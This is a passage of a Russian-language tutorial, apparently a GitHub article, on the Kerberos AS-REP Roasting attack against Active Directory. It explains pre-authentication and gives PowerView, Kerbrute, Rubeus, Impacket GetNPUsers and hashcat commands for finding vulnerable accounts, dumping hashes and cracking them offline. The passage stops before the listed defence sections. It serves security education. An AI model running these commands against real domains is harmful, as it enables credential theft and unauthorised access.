@@ -1,0 +1,1316 @@
+<article class="markdown-body entry-content container-lg" itemprop="text">
+ <ul dir="auto">
+  <li>
+   <a href="#1-%D0%B2%D0%B2%D0%B5%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5">
+    1. Введение
+   </a>
+  </li>
+  <li>
+   <a href="#2-%D0%BA%D0%B0%D0%BA-%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%B0%D0%B5%D1%82-kerberos">
+    2. Как работает
+                Kerberos
+   </a>
+   <ul dir="auto">
+    <li>
+     <a href="#21-%D1%87%D1%82%D0%BE-%D1%82%D0%B0%D0%BA%D0%BE%D0%B5-kerberos">
+      2.1 Что такое Kerberos
+     </a>
+    </li>
+    <li>
+     <a href="#22-%D0%BE%D1%81%D0%BD%D0%BE%D0%B2%D0%BD%D1%8B%D0%B5-%D0%BA%D0%BE%D0%BC%D0%BF%D0%BE%D0%BD%D0%B5%D0%BD%D1%82%D1%8B-kerberos">
+      2.2
+                        Основные компоненты Kerberos
+     </a>
+    </li>
+    <li>
+     <a href="#23-%D1%8D%D1%82%D0%B0%D0%BF%D1%8B-%D0%B0%D1%83%D1%82%D0%B5%D0%BD%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D0%B8-%D0%B2-kerberos">
+      2.3
+                        Этапы аутентификации в Kerberos
+     </a>
+     <ul dir="auto">
+      <li>
+       <a href="#%D1%8D%D1%82%D0%B0%D0%BF-1-%D0%B0%D1%83%D1%82%D0%B5%D0%BD%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D1%8F-as-req--as-rep">
+        Этап
+                                1: Аутентификация (AS-REQ / AS-REP)
+       </a>
+      </li>
+      <li>
+       <a href="#%D1%8D%D1%82%D0%B0%D0%BF-2-%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81-tgs-tgs-req--tgs-rep">
+        Этап
+                                2: Запрос TGS (TGS-REQ / TGS-REP)
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#24-pre-authentication-%D0%BF%D0%BE%D1%87%D0%B5%D0%BC%D1%83-%D1%8D%D1%82%D0%BE-%D0%B2%D0%B0%D0%B6%D0%BD%D0%BE">
+      2.4
+                        Pre-authentication: почему это важно
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#3-%D1%87%D1%82%D0%BE-%D1%82%D0%B0%D0%BA%D0%BE%D0%B5-as-rep-roasting">
+    3. Что такое AS-REP
+                Roasting
+   </a>
+   <ul dir="auto">
+    <li>
+     <a href="#31-%D1%83%D1%8F%D0%B7%D0%B2%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D1%8C">
+      3.1 Уязвимость
+     </a>
+    </li>
+    <li>
+     <a href="#32-%D0%BA%D0%B0%D0%BA-%D0%B7%D0%BB%D0%BE%D1%83%D0%BC%D1%8B%D1%88%D0%BB%D0%B5%D0%BD%D0%BD%D0%B8%D0%BA-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D1%83%D0%B5%D1%82-%D1%8D%D1%82%D1%83-%D0%BE%D1%81%D0%BE%D0%B1%D0%B5%D0%BD%D0%BD%D0%BE%D1%81%D1%82%D1%8C">
+      3.2
+                        Как злоумышленник использует эту особенность
+     </a>
+    </li>
+    <li>
+     <a href="#33-%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-%D0%B7%D0%B0%D1%88%D0%B8%D1%84%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%BD%D0%BE%D0%B3%D0%BE-as-rep-%D1%85%D1%8D%D1%88%D0%B0">
+      3.3
+                        Пример зашифрованного AS-REP-хэша
+     </a>
+    </li>
+    <li>
+     <a href="#34-%D0%BF%D0%BE%D1%87%D0%B5%D0%BC%D1%83-%D1%8D%D1%82%D0%BE-%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE">
+      3.4
+                        Почему это опасно
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#4-%D0%BF%D0%BE%D1%88%D0%B0%D0%B3%D0%BE%D0%B2%D0%BE%D0%B5-%D0%BE%D0%BF%D0%B8%D1%81%D0%B0%D0%BD%D0%B8%D0%B5-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8">
+    4.
+                Пошаговое описание атаки
+   </a>
+   <ul dir="auto">
+    <li>
+     <a href="#41-%D1%8D%D1%82%D0%B0%D0%BF-1-%D0%BF%D0%BE%D0%B8%D1%81%D0%BA-%D1%83%D1%8F%D0%B7%D0%B2%D0%B8%D0%BC%D1%8B%D1%85-%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D0%B5%D0%BB%D0%B5%D0%B9">
+      4.1
+                        Этап 1: Поиск уязвимых пользователей
+     </a>
+     <ul dir="auto">
+      <li>
+       <a href="#%D0%B2%D0%B0%D1%80%D0%B8%D0%B0%D0%BD%D1%82-1-windows-powershell--powerview">
+        Вариант
+                                1: Windows (PowerShell + PowerView)
+       </a>
+      </li>
+      <li>
+       <a href="#%D0%B2%D0%B0%D1%80%D0%B8%D0%B0%D0%BD%D1%82-2-linux-kerbrute">
+        Вариант 2: Linux
+                                (Kerbrute)
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#42-%D1%8D%D1%82%D0%B0%D0%BF-2-%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81-as-rep-%D0%B8-%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B5%D0%BD%D0%B8%D0%B5-%D1%85%D1%8D%D1%88%D0%B0">
+      4.2
+                        Этап 2: Запрос AS-REP и получение хэша
+     </a>
+     <ul dir="auto">
+      <li>
+       <a href="#%D0%B2%D0%B0%D1%80%D0%B8%D0%B0%D0%BD%D1%82-1-windows-rubeus">
+        Вариант 1: Windows
+                                (Rubeus)
+       </a>
+      </li>
+      <li>
+       <a href="#%D0%B2%D0%B0%D1%80%D0%B8%D0%B0%D0%BD%D1%82-2-linux-impacket">
+        Вариант 2: Linux
+                                (Impacket)
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#43-%D1%8D%D1%82%D0%B0%D0%BF-3-%D0%BE%D1%84%D0%BB%D0%B0%D0%B9%D0%BD-%D0%B2%D0%B7%D0%BB%D0%BE%D0%BC-%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8F">
+      4.3
+                        Этап 3: Офлайн-взлом пароля
+     </a>
+     <ul dir="auto">
+      <li>
+       <a href="#hashcat-linuxwindows">
+        Hashcat (Linux/Windows)
+       </a>
+      </li>
+      <li>
+       <a href="#john-the-ripper">
+        John the Ripper
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#44-%D1%81%D1%86%D0%B5%D0%BD%D0%B0%D1%80%D0%B8%D0%B9-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8-%D0%B2%D0%BA%D1%80%D0%B0%D1%82%D1%86%D0%B5">
+      4.4
+                        Сценарий атаки (вкратце)
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#5-%D0%BC%D0%B5%D1%82%D0%BE%D0%B4%D1%8B-%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D1%8B-%D0%BE%D1%82-as-rep-roasting">
+    5.
+                Методы защиты от AS-REP Roasting
+   </a>
+   <ul dir="auto">
+    <li>
+     <a href="#51-%D0%B2%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5-pre-authentication-%D0%B4%D0%BB%D1%8F-%D0%B2%D1%81%D0%B5%D1%85-%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D0%B5%D0%BB%D0%B5%D0%B9">
+      5.1
+                        Включение pre-authentication для всех пользователей
+     </a>
+     <ul dir="auto">
+      <li>
+       <a href="#%D0%BA%D0%B0%D0%BA-%D0%BF%D1%80%D0%BE%D0%B2%D0%B5%D1%80%D0%B8%D1%82%D1%8C">
+        Как
+                                проверить?
+       </a>
+      </li>
+      <li>
+       <a href="#%D1%87%D1%82%D0%BE-%D0%B4%D0%B5%D0%BB%D0%B0%D1%82%D1%8C">
+        Что делать?
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#52-%D0%BC%D0%B8%D0%BD%D0%B8%D0%BC%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-%D1%81%D0%B5%D1%80%D0%B2%D0%B8%D1%81%D0%BD%D1%8B%D1%85-%D1%83%D1%87%D1%91%D1%82%D0%BE%D0%BA-%D0%B1%D0%B5%D0%B7-pre-auth">
+      5.2
+                        Минимизация использования сервисных учёток без pre-auth
+     </a>
+    </li>
+    <li>
+     <a href="#53-%D0%BF%D0%BE%D0%B2%D1%8B%D1%88%D0%B5%D0%BD%D0%B8%D0%B5-%D1%81%D0%BB%D0%BE%D0%B6%D0%BD%D0%BE%D1%81%D1%82%D0%B8-%D0%B8-%D1%83%D0%BD%D0%B8%D0%BA%D0%B0%D0%BB%D1%8C%D0%BD%D0%BE%D1%81%D1%82%D0%B8-%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D0%B5%D0%B9">
+      5.3
+                        Повышение сложности и уникальности паролей
+     </a>
+    </li>
+    <li>
+     <a href="#54-%D0%BC%D0%BE%D0%BD%D0%B8%D1%82%D0%BE%D1%80%D0%B8%D0%BD%D0%B3-%D0%B8-%D0%BB%D0%BE%D0%B3%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5">
+      5.4
+                        Мониторинг и логирование
+     </a>
+     <ul dir="auto">
+      <li>
+       <a href="#%D0%B2%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5-%D0%BB%D0%BE%D0%B3%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-%D1%81%D0%BE%D0%B1%D1%8B%D1%82%D0%B8%D0%B9-kerberos">
+        Включение
+                                логирования событий Kerberos
+       </a>
+      </li>
+      <li>
+       <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-%D1%84%D0%B8%D0%BB%D1%8C%D1%82%D1%80%D0%B0-%D0%B2-siem">
+        Пример
+                                фильтра в SIEM
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#55-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5-%D0%B8%D0%BD%D1%81%D1%82%D1%80%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2-%D0%B0%D1%83%D0%B4%D0%B8%D1%82%D0%B0-%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D0%B8">
+      5.5
+                        Использование инструментов аудита безопасности
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#%D0%B7%D0%B0%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5">
+    Заключение
+   </a>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   1. Введение
+  </h1>
+ </div>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/1.png" rel="noopener noreferrer" target="_blank">
+   <img alt="1" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/1.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Атака
+  <strong>
+   AS-REP Roasting
+  </strong>
+  - это один из излюбленных методов злоумышленников для получения
+        учетных данных в инфраструктуре, использующей протокол Kerberos, например в домене Active Directory. Эта техника
+        позволяет извлечь зашифрованные хэши паролей пользователей, не требуя их предварительной аутентификации. После
+        этого хэши можно подвергнуть офлайн-атаке перебора паролей, не вызывая подозрительной активности в сети.
+ </p>
+ <p dir="auto">
+  Особенность этой атаки заключается в её
+  <strong>
+   незаметности
+  </strong>
+  и
+  <strong>
+   эффективности
+  </strong>
+  , особенно в случаях, когда в домене присутствуют учетные записи, у которых
+        отключена проверка подлинности на этапе запроса билета (pre-authentication). Такие учетные записи могут
+        появляться по ошибке или быть специально настроены для автоматических задач, что делает их уязвимыми.
+ </p>
+ <p dir="auto">
+  Понимание принципов работы этой атаки и способов защиты от неё крайне важно для системных
+        администраторов и специалистов по информационной безопасности. В этой статье мы разберёмся, как работает AS-REP
+        Roasting, как она реализуется на практике, и какие меры следует принять для минимизации рисков.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   2. Как работает Kerberos
+  </h1>
+ </div>
+ <p dir="auto">
+  Для того чтобы понять атаку AS-REP Roasting, необходимо разобраться в базовых принципах работы
+        протокола
+  <strong>
+   Kerberos
+  </strong>
+  , который является основным механизмом аутентификации в средах
+  <strong>
+   Active
+            Directory
+  </strong>
+  .
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   2.1 Что такое Kerberos
+  </h2>
+ </div>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/2.png" rel="noopener noreferrer" target="_blank">
+   <img alt="2" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/2.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  <strong>
+   Kerberos
+  </strong>
+  - это сетевой протокол аутентификации, основанный на симметричном шифровании
+        и концепции "билетов". Его задача - безопасно удостоверять пользователей и сервисы в незащищённой сети,
+        минимизируя передачу паролей. Он разработан таким образом, чтобы:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Не передавать пароли в открытом виде;
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Обеспечить взаимную аутентификацию между клиентом и сервером;
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Использовать централизованную службу проверки -
+    <strong>
+     KDC (Key Distribution
+                    Center)
+    </strong>
+    .
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   2.2 Основные компоненты Kerberos
+  </h2>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     KDC (Key Distribution Center)
+    </strong>
+    - контроллер домена, который отвечает за выдачу
+                билетов и состоит из двух логических компонентов:
+   </p>
+   <ul dir="auto">
+    <li>
+     <p dir="auto">
+      <strong>
+       AS (Authentication Server)
+      </strong>
+      - начальный этап проверки подлинности;
+     </p>
+    </li>
+    <li>
+     <p dir="auto">
+      <strong>
+       TGS (Ticket Granting Server)
+      </strong>
+      - выдает доступ к сервисам на основании
+                        ранее полученного билета.
+     </p>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     TGT (Ticket Granting Ticket)
+    </strong>
+    - билет, удостоверяющий личность пользователя.
+                Используется для получения доступа к конкретным сервисам без повторной аутентификации.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Client
+    </strong>
+    - пользователь или система, которая хочет получить доступ к ресурсу.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Service
+    </strong>
+    - целевой сервис, к которому клиент хочет подключиться (например,
+                файл-сервер).
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   2.3 Этапы аутентификации в Kerberos
+  </h2>
+ </div>
+ <p dir="auto">
+  Аутентификация в Kerberos проходит в несколько этапов. Основное внимание стоит уделить
+  <strong>
+   первому
+            этапу
+  </strong>
+  , связанному с AS-REQ и AS-REP - именно его эксплуатирует атака AS-REP Roasting.
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/3.png" rel="noopener noreferrer" target="_blank">
+   <img alt="3" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/3.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Этап 1: Аутентификация (AS-REQ / AS-REP)
+  </h3>
+ </div>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Клиент отправляет AS-REQ
+    </strong>
+    (Authentication Service Request) на KDC с просьбой о
+                получении TGT.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Если у пользователя
+    <strong>
+     включена предварительная аутентификация
+                    (pre-authentication)
+    </strong>
+    , то клиент сначала шифрует текущую метку времени своим хешем пароля и
+                прикладывает к запросу.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    KDC проверяет это "доказательство знания пароля" и, если оно успешно, высылает
+    <strong>
+     AS-REP
+    </strong>
+    - зашифрованный TGT и сессионный ключ.
+   </p>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Этап 2: Запрос TGS (TGS-REQ / TGS-REP)
+  </h3>
+ </div>
+ <ol dir="auto" start="4">
+  <li>
+   <p dir="auto">
+    Получив TGT, клиент может обращаться к TGS с TGS-REQ, чтобы получить доступ к нужному сервису.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    KDC проверяет билет и выдает сервисный билет в TGS-REP.
+   </p>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   2.4 Pre-authentication: почему это важно
+  </h2>
+ </div>
+ <p dir="auto">
+  Предварительная аутентификация служит защитным механизмом, предотвращающим несанкционированные попытки
+        подбора пароля. Она требует, чтобы клиент доказал, что знает пароль,
+  <strong>
+   до получения ответа от
+            KDC
+  </strong>
+  .
+ </p>
+ <p dir="auto">
+  Однако в некоторых случаях pre-auth отключается:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Учетная запись используется для автоматизации и скриптов;
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Администратор вручную снимает флаг "требовать pre-authentication";
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Устаревшие системы или совместимость с legacy-приложениями.
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   3. Что такое AS-REP Roasting
+  </h1>
+ </div>
+ <p dir="auto">
+  <strong>
+   AS-REP Roasting
+  </strong>
+  - это атака, использующая слабость в протоколе Kerberos, а точнее - в
+        его реализации в средах, где у некоторых пользователей отключена опция
+  <strong>
+   pre-authentication
+  </strong>
+  .
+        Такая уязвимость позволяет злоумышленнику
+  <strong>
+   получить зашифрованный хэш пароля
+  </strong>
+  без необходимости
+        прохождения полноценной аутентификации.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   3.1 Уязвимость
+  </h2>
+ </div>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/4.png" rel="noopener noreferrer" target="_blank">
+   <img alt="4" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/4.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  По умолчанию в Active Directory большинство учетных записей требуют предварительной аутентификации
+        (pre-auth), которая защищает от пассивного сбора хэшей. Однако у некоторых учетных записей (например, для служб,
+        старых систем или автоматических процессов) pre-auth может быть отключена, сознательно или по ошибке.
+ </p>
+ <p dir="auto">
+  У таких учетных записей злоумышленник может запросить билет на этапе
+  <strong>
+   AS-REQ
+  </strong>
+  , и
+        контроллер домена без дополнительных проверок вернет ответ
+  <strong>
+   AS-REP
+  </strong>
+  , который уже содержит данные,
+        зашифрованные с использованием
+  <strong>
+   ключа на основе пароля пользователя
+  </strong>
+  (обычно RC4 или AES-хэш
+        пароля).
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   3.2 Как злоумышленник использует эту особенность
+  </h2>
+ </div>
+ <p dir="auto">
+  Если злоумышленник имеет доступ в домен (например, как обычный пользователь), он может выполнить
+        следующие действия:
+ </p>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Определить учетные записи с отключённой предварительной аутентификацией.
+    </strong>
+   </p>
+   <ul dir="auto">
+    <li>
+     Это можно сделать с помощью PowerShell, утилит вроде PowerView или специальных сканеров Active
+                    Directory.
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Отправить AS-REQ от имени уязвимого пользователя.
+    </strong>
+   </p>
+   <ul dir="auto">
+    <li>
+     Поскольку pre-auth отключена, KDC не требует подтверждения личности.
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Получить AS-REP
+    </strong>
+    , содержащий:
+   </p>
+   <ul dir="auto">
+    <li>
+     Сессионный ключ, зашифрованный хешем пароля пользователя.
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Произвести офлайн-взлом
+    </strong>
+    :
+   </p>
+   <ul dir="auto">
+    <li>
+     С помощью утилит вроде
+     <strong>
+      Hashcat
+     </strong>
+     или
+     <strong>
+      John the Ripper
+     </strong>
+     можно перебрать
+                    пароли, сравнивая их хэши с полученными данными.
+    </li>
+   </ul>
+  </li>
+ </ol>
+ <p dir="auto">
+  Преимущество этого метода - полное отсутствие необходимости взаимодействовать с целевой машиной после
+        получения AS-REP: весь перебор выполняется
+  <strong>
+   на машине атакующего
+  </strong>
+  , что делает атаку очень
+        скрытной.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   3.3 Пример зашифрованного AS-REP-хэша
+  </h2>
+ </div>
+ <p dir="auto">
+  Хеш AS-REP выглядит примерно так:
+ </p>
+ <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+  <pre class="notranslate"><code>$krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac
+    </code></pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   3.4 Почему это опасно
+  </h2>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Беззвучность:
+    </strong>
+    атака не вызывает срабатываний, если не настроено логирование.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Низкий порог входа:
+    </strong>
+    можно использовать готовые инструменты и словари.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Доступность:
+    </strong>
+    даже обычный пользователь может собрать хэши других уязвимых
+                аккаунтов.
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  В случае успеха злоумышленник получает
+  <strong>
+   пароль в открытом виде
+  </strong>
+  , что открывает доступ к
+        различным ресурсам домена, вплоть до дальнейшего повышения привилегий.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   4. Пошаговое описание атаки
+  </h1>
+ </div>
+ <p dir="auto">
+  Рассмотрим, как проводится атака AS-REP Roasting на практике. Покажем, как выявить уязвимые учетные
+        записи и получить AS-REP-хэши, которые можно затем использовать для офлайн-взлома. Примеры будут приведены как
+        для Windows, так и для Linux.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   4.1 Этап 1: Поиск уязвимых пользователей
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Вариант 1: Windows (PowerShell + PowerView)
+  </h3>
+ </div>
+ <p dir="auto">
+  Сначала загружаем PowerView (часть PowerSploit), затем выполняем:
+ </p>
+ <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c1">Import-Module</span> .\PowerView.ps1
+    
+    <span class="pl-c"><span class="pl-c">#</span> Найти пользователей без pre-auth</span>
+    <span class="pl-c1">Get-DomainUser</span> <span class="pl-k">-</span>PreauthNotRequired</pre>
+ </div>
+ <p dir="auto">
+  Это выдаст список пользователей, у которых отключена опция
+  <strong>
+   "Do not require Kerberos
+            preauthentication"
+  </strong>
+  , и которые уязвимы к AS-REP Roasting.
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/5.png" rel="noopener noreferrer" target="_blank">
+   <img alt="5" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/5.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Вариант 2: Linux (Kerbrute)
+  </h3>
+ </div>
+ <p dir="auto">
+  <a href="https://github.com/ropnop/kerbrute">
+   Kerbrute
+  </a>
+  - лёгкий и быстрый инструмент для сбора
+        информации о Kerberos.
+ </p>
+ <p dir="auto">
+  Команда для поиска уязвимых учеток:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>./kerbrute_linux_amd64 userenum -domain example.local --dc 10.10.10.10 users.txt</pre>
+ </div>
+ <p dir="auto">
+  <code>
+   users.txt
+  </code>
+  - список возможных имён пользователей. Kerbrute проверит, у кого отключена
+        pre-auth, и выведет AS-REP-хэши.
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/6.png" rel="noopener noreferrer" target="_blank">
+   <img alt="6" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/6.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   4.2 Этап 2: Запрос AS-REP и получение хэша
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Вариант 1: Windows (Rubeus)
+  </h3>
+ </div>
+ <p dir="auto">
+  <strong>
+   Rubeus
+  </strong>
+  - один из самых популярных инструментов для работы с Kerberos.
+ </p>
+ <p dir="auto">
+  Сначала получаем список уязвимых учеток:
+ </p>
+ <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c1">Rubeus.exe</span> asreproast</pre>
+ </div>
+ <p dir="auto">
+  Rubeus сам выполнит AS-REQ и выведет хэши в формате, пригодном для Hashcat.
+ </p>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/7.png" rel="noopener noreferrer" target="_blank">
+   <img alt="7" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/7.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Вариант 2: Linux (Impacket)
+  </h3>
+ </div>
+ <p dir="auto">
+  <strong>
+   Impacket
+  </strong>
+  - набор Python-утилит для взаимодействия с сетевыми протоколами.
+ </p>
+ <p dir="auto">
+  Утилита
+  <code>
+   GetNPUsers.py
+  </code>
+  :
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>python3 GetNPUsers.py example.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile asrep-hashes.txt</pre>
+ </div>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/8.png" rel="noopener noreferrer" target="_blank">
+   <img alt="8" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/8.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Пример с конкретным пользователем:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>python3 GetNPUsers.py example.local/username -no-pass</pre>
+ </div>
+ <p dir="auto">
+  Если пользователь уязвим, в консоли появится
+  <code>
+   $krb5asrep$23$...
+  </code>
+  - это и есть хэш.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   4.3 Этап 3: Офлайн-взлом пароля
+  </h2>
+ </div>
+ <p dir="auto">
+  Теперь, имея AS-REP хэши, можно начать подбор пароля офлайн:
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Hashcat (Linux/Windows)
+  </h3>
+ </div>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>hashcat -m 18200 asrep-hashes.txt rockyou.txt</pre>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <code>
+     -m 18200
+    </code>
